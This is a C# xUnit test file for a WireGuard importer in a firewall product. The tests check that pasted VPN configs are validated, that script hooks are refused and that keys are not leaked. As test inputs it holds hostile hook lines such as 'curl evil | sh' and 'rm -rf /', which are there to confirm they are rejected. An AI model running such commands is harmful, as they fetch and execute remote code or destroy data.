using Microsoft.Extensions.Logging.Abstractions;
using Microsoft.Extensions.Options;
using Moq;
using NetFirewall.Models.Vpn;
using NetFirewall.Services.Vpn;
using Npgsql;
using Xunit;

namespace NetFirewall.Tests.Vpn;

/// <summary>
/// "Conexiones salientes": a new client interface from a pasted provider / remote-site
/// config. Pasted text is untrusted — it must never become a root command.
/// </summary>
public sealed class WireGuardOutboundTests
{
    private static readonly string Priv = Convert.ToBase64String(Enumerable.Range(1, 32).Select(i => (byte)i).ToArray());
    private static readonly string Pub  = Convert.ToBase64String(Enumerable.Range(40, 32).Select(i => (byte)i).ToArray());

    private static string Conf(string extraInterface = "", string allowed = "0.0.0.0/0, ::/0") => $"""
        [Interface]
        PrivateKey = {Priv}
        Address = 10.64.12.7/32
        DNS = 10.64.0.1
        {extraInterface}

        [Peer]
        PublicKey = {Pub}
        AllowedIPs = {allowed}
        Endpoint = us-nyc.provider.example:51820
        """;

    [Theory]
    [InlineData("PostUp = curl evil | sh")]
    [InlineData("PreUp = rm -rf /")]
    [InlineData("postdown = reboot")]
    [InlineData("PreDown=true")]
    [InlineData("SaveConfig = true")]
    public void ScriptHooks_AreRefused(string hook)
    {
        var no = Assert.IsType<WireGuardImporter.OutboundRejected>(WireGuardImporter.ValidateOutbound(Conf(hook)).Value);
        Assert.Contains("cannot run commands", no.Reason);
    }

    [Fact]
    public void Error_NeverEchoesTheKey()
    {
        var no = Assert.IsType<WireGuardImporter.OutboundRejected>(
            WireGuardImporter.ValidateOutbound(Conf().Replace("Endpoint = us-nyc.provider.example:51820", "")).Value);
        Assert.DoesNotContain(Priv, no.Reason);
    }

    [Fact]
    public void TwoPeers_AreRefused()
    {
        var no = Assert.IsType<WireGuardImporter.OutboundRejected>(WireGuardImporter.ValidateOutbound(
            Conf() + $"\n[Peer]\nPublicKey = {Pub}\nAllowedIPs = 10.0.0.0/8\nEndpoint = b.example:1\n").Value);
        Assert.Contains("exactly one [Peer]", no.Reason);
    }

    [Fact]
    public void ValidConfig_Passes() =>
        Assert.IsType<WireGuardImporter.ParsedOutbound>(WireGuardImporter.ValidateOutbound(Conf()).Value);

    private static (WireGuardImporter importer, Mock<IWireGuardService> wg) Make(params WgServer[] existing)
    {
        var wg = new Mock<IWireGuardService>();
        wg.Setup(x => x.ListServersAsync(It.IsAny<CancellationToken>())).ReturnsAsync(existing);
        wg.Setup(x => x.GetPeersAsync(It.IsAny<Guid>(), It.IsAny<CancellationToken>())).ReturnsAsync(Array.Empty<WgPeer>());
        wg.Setup(x => x.SaveServerAsync(It.IsAny<WgServer>(), It.IsAny<CancellationToken>()))
          .ReturnsAsync((WgServer s, CancellationToken _) => { s.Id = Guid.NewGuid(); return s; });
        wg.Setup(x => x.CreatePeerAsync(It.IsAny<WgPeer>(), It.IsAny<CancellationToken>()))
          .ReturnsAsync((WgPeer p, CancellationToken _) => p);
        var apply = new Mock<IWireGuardApplyService>();
        apply.Setup(x => x.DerivePublicKeyAsync(Priv, It.IsAny<CancellationToken>())).ReturnsAsync("DERIVED");
        var importer = new WireGuardImporter(wg.Object, apply.Object,
            NpgsqlDataSource.Create("Host=localhost;Username=unused"),
            NullLogger<WireGuardImporter>.Instance, Options.Create(new WireGuardApplyOptions()));
        return (importer, wg);
    }

    [Fact]
    public async Task Provider_BecomesAClientInterface_WithTableOff_NoHooks_NoProviderDns()
    {
        var (importer, wg) = Make(new WgServer { Id = Guid.NewGuid(), Name = "wg0", Mode = "server" });

        var r = await importer.CreateOutboundAsync(Conf(), "Mullvad NYC");

        Assert.Equal("wgc1", r.Server.Name);
        Assert.Equal("client", r.Server.Mode);
        Assert.True(r.Server.TableOff);
        Assert.Equal(0, r.Server.ListenPort);
        Assert.Null(r.Server.Dns);
        Assert.Null(r.Server.PostUp);
        Assert.Equal("DERIVED", r.Server.PublicKey);
        var peer = Assert.Single(r.Peers);
        Assert.Equal("upstream", peer.Role);
        Assert.Equal("Mullvad NYC", peer.Name);
    }

    [Fact]
    public async Task RemoteSite_BecomesASitePeer_WithItsLanAsRemoteSubnets()
    {
        var (importer, _) = Make();
        var r = await importer.CreateOutboundAsync(Conf(allowed: "10.20.0.1/32, 192.168.50.0/24"), null);
        var peer = Assert.Single(r.Peers);
        Assert.Equal("site", peer.Role);
        Assert.Equal(["192.168.50.0/24"], peer.AllowedSubnets);
    }

    [Fact]
    public async Task SplitDefaultProvider_IsAnUpstream_NotASiteCoveringTheInternet()
    {
        var (importer, _) = Make();
        var r = await importer.CreateOutboundAsync(Conf(allowed: "0.0.0.0/1, 128.0.0.0/1, ::/1, 8000::/1"), null);
        var peer = Assert.Single(r.Peers);
        Assert.Equal("upstream", peer.Role);
        Assert.Empty(peer.AllowedSubnets);
    }

    [Fact]
    public async Task SameRemoteKeyTwice_IsRefused()
    {
        var existing = new WgServer { Id = Guid.NewGuid(), Name = "wgc1", Mode = "client" };
        var (importer, wg) = Make(existing);
        wg.Setup(x => x.GetPeersAsync(existing.Id, It.IsAny<CancellationToken>()))
          .ReturnsAsync(new[] { new WgPeer { PublicKey = Pub } });

        await Assert.ThrowsAsync<InvalidOperationException>(() => importer.CreateOutboundAsync(Conf(), null));
        wg.Verify(x => x.SaveServerAsync(It.IsAny<WgServer>(), It.IsAny<CancellationToken>()), Times.Never);
    }
}
